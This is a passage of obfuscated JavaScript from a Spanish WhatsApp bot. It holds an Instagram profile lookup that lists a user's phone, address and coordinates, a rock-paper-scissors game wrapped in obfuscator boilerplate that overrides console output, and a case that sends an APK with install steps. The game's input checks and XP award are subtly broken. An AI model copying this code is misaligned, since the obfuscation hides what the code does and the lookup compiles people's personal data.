/*////*/var _0x3054=['is_verified','full_name',',\x20REALIZADA\x20POR\x20🐉Samu330🍒🌐*\x0a\x0a*🔰PK*:\x20','has_chaining','is_interest_account','is_private','total_igtv_videos','public_email','follow_friction_type','_\x0a*🛒Usuarios\x20con\x20etiqueta:*\x20_','biography','_\x0a*🤔Tiene\x20videos?:*\x20_','username','494427wilqiQ','_\x0a*🕋Es\x20una\x20empresa\x20potencial?:*\x20_','is_eligible_for_smb_support_flow','8CgwDrM','_\x0a*🧵Tiene\x20carretes\x20destacados?:*\x20_','_\x0a*🎈Efectos\x20AR:*\x20_','_\x0a*💠Muestra\x20información\x20de\x20la\x20publicación\x20entry_point?:*\x20_','94370kWMTFK','can_be_reported_as_fraud','_\x0a*📞Metodo\x20de\x20contacto\x20a\x20la\x20empresa:*\x20_','media_count','_\x0a*🔐La\x20cuenta\x20es\x20privada?:*\x20_','_\x0a*🤩Es\x20favorito?*\x20_','_\x0a*✏Mensajeria\x20directa:*\x20_','direct_messaging','_\x0a*👻Tiene\x20mejores\x20amigos\x20invisibles?:*\x20_','is_business','693435vrSLfk','_\x0a*🥇Insignias\x20de\x20la\x20cuenta*\x20_','_\x0a*👥Puede\x20ocultar\x20contactos\x20publicos?:*\x20_','account_badges','open_external_url_with_in_app_browser','_\x0a*✅La\x20cuenta\x20esta\x20verificada?:*\x20_','has_videos','_\x0a*📚Biografia:*\x20_','_\x0a*💎Muestra\x20a\x20detalle\x20la\x20transparencia\x20de\x20la\x20cuenta?:*\x20_','_\x0a*🕋Tipo\x20de\x20cuenta\x20sugerida\x20para\x20conversión\x20profesional:*\x20_','_\x0a*🏍Siguiendo:*\x20_','_\x0a*🗺Localizaciones\x20compartidas:*\x20_','business_contact_method','total_ar_effects','whatsapp_number','_\x0a*🤝🏻Segidores\x20mutuos:*\x20_','instagram_location_id','should_show_public_contacts','391140nNkfTN','is_call_to_action_enabled','city_id','professional_conversion_suggested_account_type','has_unseen_besties_media','96062RHrieK','_\x0a*👑Esta\x20conmemorado?:*\x20_','_\x0a*👤Tiene\x20una\x20foto\x20de\x20perfil\x20anónima?:*\x20_','_\x0a*🔰Deberia\x20mostrar\x20categoria?:*\x20_','is_memorialized','27149SHRCKq','_\x0a*👁‍🗨Puede\x20ocultar\x20la\x20categoria?:*\x20_','_\x0a*⚡Following\x20tag*\x20_','_\x0a*📲Numero\x20de\x20contacto:*\x20_','public_phone_country_code','_\x0a*🧩Imagenes/Videos\x20publicados:*\x20_','external_url','city_name','_\x0a*🗺Latitud:*\x20_','10tqOZki','1159IWchuE','1nejXSn','address_street','_\x0a*🔐Está\x20habilitada\x20la\x20acción\x20de\x20llamada?:*\x20_','_\x0a*🤗Es\x20mejor\x20amig@?:*\x20_','_\x0a*🐱‍👤Incluye\x20estado\x20de\x20lista\x20negra\x20directa?:*\x20_','_\x0a*💠Nombre\x20completo:*\x20_','_\x0a*🛒Es\x20una\x20empresa?:*\x20_','can_hide_category','_\x0a*👥Total\x20de\x20seguidores:*\x20_','_\x0a*🪀Numero\x20de\x20WhatsApp:*\x20_','_\x0a*✨Tipo\x20de\x20cuenta:*\x20_','\x0a*🙋🏻‍♂️Nombre\x20de\x20usuario:*\x20_','_\x0a*🚧Nombre\x20de\x20la\x20calle:*\x20_','991XshNSH','_\x0a*🌐Codigo\x20postal:*\x20_','_\x0a*🧐Es\x20una\x20cuenta\x20interesante?:*\x20_','_\x0a*🧊Seguidores\x20mediante\x20tipo\x20de\x20fricción:*\x20_','_\x0a*🌐URL\x20externo:*\x20_','should_show_category','longitude','has_biography_translation','latitude','_\x0a*📲Numero\x20publico:*\x20_','geo_media_count','is_bestie','_\x0a*Videos\x20en\x20igtv:*\x20_','can_hide_public_contacts','_\x0a*♻La\x20biografia\x20a\x20sido\x20traducida?:*\x20_'];function _0x4106(_0x3669fd,_0x4dbae8){return _0x4106=function(_0x3054cc,_0x41061e){_0x3054cc=_0x3054cc-0x130;var _0xbe89cd=_0x3054[_0x3054cc];return _0xbe89cd;},_0x4106(_0x3669fd,_0x4dbae8);}var _0x52f62e=_0x4106;(function(_0x154634,_0x56ff80){var _0x4691fb=_0x4106;while(!![]){try{var _0x1bb356=-parseInt(_0x4691fb(0x177))*-parseInt(_0x4691fb(0x145))+-parseInt(_0x4691fb(0x132))+parseInt(_0x4691fb(0x137))*-parseInt(_0x4691fb(0x147))+-parseInt(_0x4691fb(0x170))+parseInt(_0x4691fb(0x13c))*parseInt(_0x4691fb(0x173))+-parseInt(_0x4691fb(0x181))+parseInt(_0x4691fb(0x154))*parseInt(_0x4691fb(0x146));if(_0x1bb356===_0x56ff80)break;else _0x154634['push'](_0x154634['shift']());}catch(_0x35fe72){_0x154634['push'](_0x154634['shift']());}}}(_0x3054,0x9ae1d),a='*🌐BUSQUEDA\x20AVANZADA\x20SOBRE\x20EL\x20USUARIO\x20'+q+_0x52f62e(0x165)+s['pk']+_0x52f62e(0x152)+s[_0x52f62e(0x16f)]+_0x52f62e(0x14c)+s[_0x52f62e(0x164)]+_0x52f62e(0x17b)+s[_0x52f62e(0x168)]+'_\x0a*📁ID\x20de\x20la\x20foto\x20de\x20perfil:*\x20_'+s['profile_pic_id']+_0x52f62e(0x186)+s[_0x52f62e(0x163)]+_0x52f62e(0x157)+s[_0x52f62e(0x16b)]+_0x52f62e(0x139)+s['has_anonymous_profile_picture']+_0x52f62e(0x141)+s[_0x52f62e(0x17a)]+_0x52f62e(0x18c)+s[_0x52f62e(0x15e)]+_0x52f62e(0x14f)+s['follower_count']+_0x52f62e(0x18b)+s['following_count']+_0x52f62e(0x13e)+s['following_tag_count']+_0x52f62e(0x188)+s[_0x52f62e(0x16d)]+_0x52f62e(0x158)+s[_0x52f62e(0x142)]+_0x52f62e(0x162)+s[_0x52f62e(0x15b)]+_0x52f62e(0x160)+s[_0x52f62e(0x169)]+_0x52f62e(0x16e)+s[_0x52f62e(0x187)]+_0x52f62e(0x175)+s[_0x52f62e(0x18e)]+_0x52f62e(0x16c)+s['usertags_count']+_0x52f62e(0x17c)+s['is_favorite']+_0x52f62e(0x156)+s[_0x52f62e(0x167)]+'_\x0a*⛓Tiene\x20encadenamiento?:*\x20_'+s[_0x52f62e(0x166)]+_0x52f62e(0x190)+s['mutual_followers_count']+_0x52f62e(0x174)+s['has_highlight_reels']+'_\x0a*🤠Tiene\x20gia?:*\x20_'+s['has_guides']+'_\x0a*❌Puede\x20denunciarse\x20como\x20fraude?:*\x20_'+s[_0x52f62e(0x178)]+'_\x0a*🔰Es\x20elegible\x20para\x20el\x20flujo\x20de\x20soporte\x20de\x20pymes?:*\x20_'+s[_0x52f62e(0x172)]+'_\x0a*🛵Socio\x20de\x20apoyo\x20de\x20pymes:*\x20_'+s['smb_support_partner']+_0x52f62e(0x17d)+s[_0x52f62e(0x17e)]+_0x52f62e(0x153)+s[_0x52f62e(0x148)]+_0x52f62e(0x179)+s[_0x52f62e(0x18d)]+'_\x0a*🌇ID\x20de\x20la\x20ciudad:*\x20_'+s[_0x52f62e(0x134)]+'_\x0a*🌇Nombre\x20de\x20la\x20cuidad*\x20_'+s[_0x52f62e(0x143)]+_0x52f62e(0x13f)+s['contact_phone_number']+_0x52f62e(0x149)+s[_0x52f62e(0x133)]+_0x52f62e(0x144)+s[_0x52f62e(0x15c)]+'_\x0a*🗺Longitud*\x20_'+s[_0x52f62e(0x15a)]+'_\x0a*📩EMAIL\x20publico:*\x20_'+s[_0x52f62e(0x16a)]+'_\x0a*🌍Codigo\x20de\x20pais\x20del\x20numero\x20publico:*\x20_'+s[_0x52f62e(0x140)]+_0x52f62e(0x15d)+s['public_phone_number']+_0x52f62e(0x155)+s['zip']+'_\x0a*⚙Localizacion\x20del\x20ID\x20de\x20Instagram:*\x20_'+s[_0x52f62e(0x130)]+_0x52f62e(0x14d)+s[_0x52f62e(0x180)]+_0x52f62e(0x151)+s['account_type']+_0x52f62e(0x18a)+s[_0x52f62e(0x135)]+_0x52f62e(0x13d)+s[_0x52f62e(0x14e)]+_0x52f62e(0x183)+s[_0x52f62e(0x161)]+_0x52f62e(0x13a)+s[_0x52f62e(0x159)]+'_\x0a*👥Deberia\x20mostrar\x20contactos\x20publicos?:*\x20_'+s[_0x52f62e(0x131)]+_0x52f62e(0x182)+s[_0x52f62e(0x184)]+_0x52f62e(0x150)+s[_0x52f62e(0x18f)]+_0x52f62e(0x14b)+s['include_direct_blacklist_status']+_0x52f62e(0x171)+s['is_potential_business']+_0x52f62e(0x176)+s['show_post_insights_entry_point']+'_\x0a*👥Solicitud\x20de\x20contactos\x20habilitada?:*\x20_'+s['request_contact_enabled']+_0x52f62e(0x14a)+s[_0x52f62e(0x15f)]+_0x52f62e(0x17f)+s[_0x52f62e(0x136)]+_0x52f62e(0x189)+s['show_account_transparency_details']+'_\x0a*⛓Expande\x20automáticamente\x20el\x20encadenamiento?:*\x20_'+s['auto_expand_chaining']+'_\x0a*✏Resaltar\x20compartir\x20deshabilitado?:*\x20_'+s['highlight_reshare_disabled']+_0x52f62e(0x138)+s[_0x52f62e(0x13b)]+'_\x0a*📲Abre\x20URLs\x20externos\x20con\x20el\x20navegador\x20de\x20la\x20aplicación?:*\x20_'+s[_0x52f62e(0x185)]+'_');
/*////*/reply(a) 
/*////*/break
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	
	
//Juego Creado por Samu330
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/*////*/case 'jugar':
/*////*/if (!isRegister) return reply(mess.only.usrReg)
/*////*/const _0x5f5c=['jugar\x20(Escojes\x20tu\x20arma)\x20=\x20','log','tijera','length','return\x20(function()\x20','21349PZSUzQ','random','^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}','✌🏻\x20tijera','1416lRtOeC','4007ltMcJR','26916PiOMZI','\x0a*✊🏻\x20piedra\x20rompe\x20tijeras.*','Ja...\x20perdiste,\x20tranquilo,\x20te\x20entiendo,\x20eres\x20Humano😌','49000XhJFNH','constructor','*Reglas\x20de\x20Juego:*‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\x0a\x0a_El\x20juego\x20se\x20llama:_\x20*Piedra,\x20papel\x20o\x20tijera.*\x0a\x0a_El\x20objetivo\x20es\x20vencer\x20al\x20oponente\x20seleccionando\x20el\x20arma\x20que\x20gana,\x20según\x20las\x20siguientes\x20reglas:_\x0a\x0a\x09-\x20✊🏻\x20La\x20piedra\x20aplasta\x20la\x20tijera.\x20(Gana\x20la\x20piedra.)\x0a\x09-\x20✌🏻\x20La\x20tijera\x20corta\x20el\x20papel.\x20(Gana\x20la\x20tijera.)\x0a\x09-\x20🖐🏻\x20El\x20papel\x20envuelve\x20la\x20piedra.\x20(Gana\x20el\x20papel.)\x0a\x09-\x20🔁\x20En\x20caso\x20de\x20empate\x20(que\x20dos\x20jugadores\x20elijan\x20el\x20mismo\x20elemento\x20o\x20que\x20tres\x20jugadores\x20elijan\x20cada\x20uno\x20un\x20objeto\x20distinto),\x20se\x20juega\x20otra\x20vez.\x0a\x09\x0a*Aqui\x20cada\x20quien\x20jugara\x20con\x20el\x20Bot,\x20se\x20juega\x20de\x20la\x20siguiente\x20manera:*\x0a\x0a','3OPRDdZ','error','trace','🖐🏻\x20papel','Lo\x20siento,\x20pero\x20*','__proto__','101040OQjLWe','nivel\x20para\x20corroborar\x20tu\x20experiencia.*','41SnRebr','*Nimodo,\x20Aprende\x20de\x20mi😏*','150520bLaygd','piedra','😨\x20Pero\x20que...\x20Me\x20as\x20ganado!!\x0a_✌🏻\x20tijera\x20corta\x20papel!_\x20*Bien\x20jugado!!*\x0a\x0a_Recibiste\x2010xp\x20😉_\x0a*Escribe\x20','jugar\x20piedra/papel/tijera\x0a\x0a_Si\x20logras\x20ganarle\x20al\x20Bot,\x20obtienes\x20una\x20recompensa!!_\x0a\x0a┎┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┒\x0a\x20*Juegos\x20By:*\x0a\x20_Samu330_\x20wa.me/+529984907794\x0a┖┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┚','console','info','{}.constructor(\x22return\x20this\x22)(\x20)','floor','4yjvaKM','*\x20no\x20es\x20un\x20elemento\x20compatible.\x0a_Solo\x20puedes\x20elegir\x20entre\x20piedra,\x20papel\x20o\x20tijera!_','9sXuwNS','papel','✊🏻\x20piedra','bind','152cvjKoE','*😂👌🏻*','5219984907794@s.whatsapp.net','prototype','warn','return\x20/\x22\x20+\x20this\x20+\x20\x22/','toString','*😫uh...\x20Empatamos!!\x20jugemos\x20de\x20nuevo!!*','table','apply','test'];const _0x50a80c=_0x3c7d;(function(_0x153eef,_0x3d0c01){const _0x395d6e=_0x3c7d;while(!![]){try{const _0x39211c=parseInt(_0x395d6e(0xa0))*-parseInt(_0x395d6e(0x94))+parseInt(_0x395d6e(0x7e))*parseInt(_0x395d6e(0x9d))+parseInt(_0x395d6e(0x72))+parseInt(_0x395d6e(0x76))+-parseInt(_0x395d6e(0x74))*parseInt(_0x395d6e(0x99))+parseInt(_0x395d6e(0x98))*parseInt(_0x395d6e(0x84))+parseInt(_0x395d6e(0x9a))*-parseInt(_0x395d6e(0x80));if(_0x39211c===_0x3d0c01)break;else _0x153eef['push'](_0x153eef['shift']());}catch(_0x294ddc){_0x153eef['push'](_0x153eef['shift']());}}}(_0x5f5c,0x2eed6));const _0x2053c4=function(){let _0x513bfb=!![];return function(_0x4bbee9,_0x598758){const _0x5eca46=_0x513bfb?function(){if(_0x598758){const _0x5e80c9=_0x598758['apply'](_0x4bbee9,arguments);return _0x598758=null,_0x5e80c9;}}:function(){};return _0x513bfb=![],_0x5eca46;};}(),_0x39b00f=_0x2053c4(this,function(){const _0x665fc2=function(){const _0x2e1ba8=_0x3c7d,_0x557f7d=_0x665fc2[_0x2e1ba8(0x9e)](_0x2e1ba8(0x89))()[_0x2e1ba8(0x9e)](_0x2e1ba8(0x96));return!_0x557f7d[_0x2e1ba8(0x8e)](_0x39b00f);};return _0x665fc2();});_0x39b00f();const _0x5b3b04=function(){let _0x48bc9e=!![];return function(_0x322705,_0x532a05){const _0x1b4bca=_0x48bc9e?function(){const _0x3a54bf=_0x3c7d;if(_0x532a05){const _0x46fe13=_0x532a05[_0x3a54bf(0x8d)](_0x322705,arguments);return _0x532a05=null,_0x46fe13;}}:function(){};return _0x48bc9e=![],_0x1b4bca;};}(),_0x210381=_0x5b3b04(this,function(){const _0x203c8d=_0x3c7d;let _0x151df8;try{const _0x59ff0e=Function(_0x203c8d(0x93)+_0x203c8d(0x7c)+');');_0x151df8=_0x59ff0e();}catch(_0x1d769d){_0x151df8=window;}const _0x4c30ca=_0x151df8[_0x203c8d(0x7a)]=_0x151df8[_0x203c8d(0x7a)]||{},_0x2cb8b2=[_0x203c8d(0x90),_0x203c8d(0x88),_0x203c8d(0x7b),_0x203c8d(0xa1),'exception',_0x203c8d(0x8c),_0x203c8d(0xa2)];for(let _0x273e1b=0x0;_0x273e1b<_0x2cb8b2['length'];_0x273e1b++){const _0x1dea26=_0x5b3b04[_0x203c8d(0x9e)][_0x203c8d(0x87)][_0x203c8d(0x83)](_0x5b3b04),_0x164272=_0x2cb8b2[_0x273e1b],_0x239d4e=_0x4c30ca[_0x164272]||_0x1dea26;_0x1dea26[_0x203c8d(0xa5)]=_0x5b3b04['bind'](_0x5b3b04),_0x1dea26[_0x203c8d(0x8a)]=_0x239d4e['toString'][_0x203c8d(0x83)](_0x239d4e),_0x4c30ca[_0x164272]=_0x1dea26;}});_0x210381();const yo=_0x50a80c(0x86);if(!q)return mentions(_0x50a80c(0x9f)+prefix+_0x50a80c(0x8f)+prefix+_0x50a80c(0x79),yo,!![]);function _0x3c7d(_0xfb7ab7,_0x36d282){return _0x3c7d=function(_0x338ef2,_0x210381){_0x338ef2=_0x338ef2-0x72;let _0x5b3b04=_0x5f5c[_0x338ef2];return _0x5b3b04;},_0x3c7d(_0xfb7ab7,_0x36d282);}frase=[_0x50a80c(0x9c),_0x50a80c(0x75),_0x50a80c(0x85),'*Te\x20atreviste\x20a\x20jugar\x20contra\x20mi,\x20ahora\x20disfruta\x20tu\x20derrota😈*'];const frase1=frase[Math[_0x50a80c(0x7d)](Math[_0x50a80c(0x95)]()*frase[_0x50a80c(0x92)])];juego=['✊🏻\x20piedra',_0x50a80c(0xa3),_0x50a80c(0x97),_0x50a80c(0x82),_0x50a80c(0xa3),_0x50a80c(0x97),_0x50a80c(0x82),_0x50a80c(0xa3),_0x50a80c(0x97)];const juego1=juego[Math[_0x50a80c(0x7d)](Math[_0x50a80c(0x95)]()*juego['length'])];if(!q=='piedra')return reply(_0x50a80c(0xa4)+q+_0x50a80c(0x7f));if(!q==_0x50a80c(0x81))return reply('Lo\x20siento,\x20pero\x20*'+q+'*\x20no\x20es\x20un\x20elemento\x20compatible.\x0a_Solo\x20puedes\x20elegir\x20entre\x20piedra,\x20papel\x20o\x20tijera!_');if(!q==_0x50a80c(0x91))return reply('Lo\x20siento,\x20pero\x20*'+q+_0x50a80c(0x7f));reply(juego1);if(q==_0x50a80c(0x77)){const jpiedra=''+juego1;if(jpiedra==_0x50a80c(0x82))return reply(_0x50a80c(0x8b));if(jpiedra==_0x50a80c(0xa3))return reply(frase1+'\x0a*🖐🏻\x20Papel\x20envuelve\x20piedra.*');if(jpiedra==_0x50a80c(0x97))reply('😨\x20Pero\x20que...\x20Me\x20as\x20ganado!!\x0a_✊🏻\x20piedra\x20rompe\x20tijera!_\x20*Bien\x20jugado!!*\x0a\x0a_Recibiste\x2010xp\x20😉_\x0a*Escribe\x20'+prefix+_0x50a80c(0x73));addLevelingXp(sender,0xa);}if(q==_0x50a80c(0x81)){const jpiedra=''+juego1;if(jpiedra=='🖐🏻\x20papel')return reply(_0x50a80c(0x8b));if(jpiedra==_0x50a80c(0x97))return reply(frase1+'\x0a*✌🏻\x20tijera\x20corta\x20papel.*');if(jpiedra=='✊🏻\x20piedra')reply('😨\x20Pero\x20que...\x20Me\x20as\x20ganado!!\x0a_🖐🏻\x20papel\x20envuelve\x20piedra!_\x20*Bien\x20jugado!!*\x0a\x0a_Recibiste\x2010xp\x20😉_\x0a*Escribe\x20'+prefix+_0x50a80c(0x73));addLevelingXp(sender,0xa);}if(q==_0x50a80c(0x91)){const jpiedra=''+juego1;if(jpiedra==_0x50a80c(0x97))return reply(_0x50a80c(0x8b));if(jpiedra==_0x50a80c(0x82))return reply(frase1+_0x50a80c(0x9b));if(jpiedra=='🖐🏻\x20papel')reply(_0x50a80c(0x78)+prefix+_0x50a80c(0x73));addLevelingXp(sender,0xa);}
/*////*/break
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		
case 'nivel':
const getLevel1 = getLevelingLevel(sender)
const lvup =  `✴ _*🧗🏻‍♂️Nivel Actual!͟*_ ✴
	
𓆩*𓆪 *💠 Nombre:* ${pushname} 𓆩*𓆪
	
┎┈┈┈┈┈┈┈┈┈┈┈┈┈┈
✨XP: ${getLevelingXp(sender)}
📚Nivel: ${getLevel1} ➫ ${getLevelingLevel(sender)}
🕋rango: ${rango}
┖┈┈┈┈┈┈┈┈┈┈┈┈┈┈`
samu330.sendMessage(from, lvup, MessageType.text, {quoted: { key: {                
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"documentMessage": { "title": `✍🏻Nivel ${nivelActual}`, 'jpegThumbnail': fs.readFileSync('./src/ara.png')}
}}
})
break
		
		
case 'reglas':
reply(`*Hola, estas son las reglas que debes seguir para que no tengas ningun problema con el propietario del bot*\n\n1- _Manten una formalidad respetuosa_\n2- _Si vas a añadir el bot a algun grupo, verifica que el grupo cumpla con los requisitos que son tener minimo 5 personas_\n3- _❌NO AGAS SPAM DE COMANDOS❌_ *Esto es enserio, puedes hacer que el bot se apage*\n4- _📵NO AGAS LLAMADAS POR WHATSAPP AL PROPIETARIO DEL BOT📵_ *Seras bloqueado inmediatamente*\n5- _🕐Espera el tiempo nesesario cuando pidas alguna funcion, ya que algunas tardan en realizarse, no vuelvas a pedir el comando nuevamente hasta que te llege un mensaje de error_\n\nLee las reglas y cumplelas, no te quieras hacer el chistoso, por que no lo eres y ni te sale, asi que porfavor respeta las reglas.`)
break
//Con este case se envia la aplicacion Tutorial
case 'tutorial':
case 'git':
case 'crear':
result = fs.readFileSync(`./media/app.apk`)
samu330.sendMessage(from, result, document, {
mimetype: 'application/vnd.android.package-archive', filename: '🐉AppBot🐉 by 📌Samu330🥀', quoted: fdoc})
reply(`*╰⊱♥⊱╮ღ꧁ P͟a͟r͟a͟ ͟c͟r͟e͟a͟r͟/͟I͟n͟s͟t͟a͟l͟a͟r͟ ꧂ღ╭⊱♥≺*

~~~~<💚>~~~~
_Nesecitas primeramente tener instalado termux_

*https://f-droid.org/en/packages/com.termux/*

Una vez instalada la app, procedemos a abrirla, y damos permisos de almacenamiento, escribiendo el siguiente comando en la terminal:

*termux-setup-storage*

Una vez que aceptemos los permisos, continuamos...
Los comandos se ejecutaran 1 x 1:

- apt update && upgrade
- pkg install git
- pkg install bash
- pkg install nodejs
- git clone https://github.com/Samu330/NyanBot
- cd NyanBot
- bash install.sh

